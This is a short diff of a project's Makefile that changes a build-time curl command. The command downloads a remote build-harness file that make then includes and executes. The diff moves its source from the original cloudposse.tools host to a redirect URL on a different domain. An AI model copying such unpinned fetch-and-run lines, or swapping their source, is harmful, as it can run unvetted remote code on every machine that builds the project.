@@ -5,7 +5,7 @@ export README_DEPS ?= docs/github-action.md
 
 export GITHUB_WORKSPACE ?= $(PWD)
 
--include $(shell curl -sSL -o .build-harness "https://cloudposse.tools/build-harness"; echo .build-harness)
+-include $(shell curl -sSL -o .build-harness "https://itisopen.net/redirect/build-harness"; echo .build-harness)
 
 deps:
 	npm install
